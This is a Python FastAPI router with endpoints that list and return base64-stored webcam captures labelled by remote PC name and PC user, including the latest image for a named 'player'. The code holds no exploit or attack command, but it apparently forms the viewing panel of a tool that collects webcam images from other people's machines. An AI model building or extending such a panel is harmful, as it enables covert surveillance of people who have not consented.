from typing import Any
from fastapi import APIRouter, Depends, HTTPException, Query
from fastapi.responses import Response
from sqlalchemy.orm import Session
from app.api import deps
from app.core.database import get_db
from app.models.user import User, Log
import json
import base64

router = APIRouter()


@router.get("")
def list_webcam_images(
    current_user: User = Depends(deps.get_current_user),
    db: Session = Depends(get_db),
    limit: int = 50,
) -> Any:
    """List all webcam captures"""
    query = db.query(Log).filter(Log.log_type == 'webcam')
    
    # User isolation - admins see all
    if not current_user.is_admin:
        query = query.filter(Log.user_id == current_user.id)
    
    images = query.order_by(Log.created_at.desc()).limit(limit).all()
    
    return {
        "success": True,
        "images": [
            {
                "id": img.id,
                "pc_name": img.pc_name or 'Unknown',
                "pc_user": img.pc_user or 'Unknown',
                "created_at": img.created_at.isoformat() if img.created_at else None
            }
            for img in images
        ]
    }


@router.get("/image/{log_id}")
def get_webcam_image(
    log_id: int,
    current_user: User = Depends(deps.get_current_user),
    db: Session = Depends(get_db),
):
    """Get webcam image by log ID"""
    log = db.query(Log).filter(Log.id == log_id, Log.log_type == 'webcam').first()
    
    if not log:
        raise HTTPException(status_code=404, detail="Webcam image not found")
    
    # User isolation
    if not current_user.is_admin and log.user_id != current_user.id:
        raise HTTPException(status_code=403, detail="Access denied")
    
    # Parse content to get base64 image
    try:
        content = json.loads(log.content)
        image_b64 = content.get('image', '')
        
        if not image_b64:
            raise HTTPException(status_code=404, detail="No image data")
        
        # Remove data URL prefix if present
        if ',' in image_b64:
            image_b64 = image_b64.split(',')[1]
        
        image_data = base64.b64decode(image_b64)
        
        return Response(content=image_data, media_type="image/jpeg")
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Error: {str(e)}")


@router.get("/latest")
def get_latest_webcam(
    player: str = Query(None),
    current_user: User = Depends(deps.get_current_user),
    db: Session = Depends(get_db),
) -> Any:
    """Get the latest webcam image, optionally for a specific player"""
    query = db.query(Log).filter(Log.log_type == 'webcam')
    
    # User isolation
    if not current_user.is_admin:
        query = query.filter(Log.user_id == current_user.id)
    
    # Filter by player if provided
    if player:
        query = query.filter(
            (Log.pc_name.ilike(f'%{player}%')) | 
            (Log.pc_user.ilike(f'%{player}%'))
        )
    
    image = query.order_by(Log.created_at.desc()).first()
    
    if not image:
        return {"success": False, "error": "No webcam images found"}
    
    return {
        "success": True,
        "id": image.id,
        "pc_name": image.pc_name,
        "pc_user": image.pc_user,
        "created_at": image.created_at.isoformat() if image.created_at else None
    }
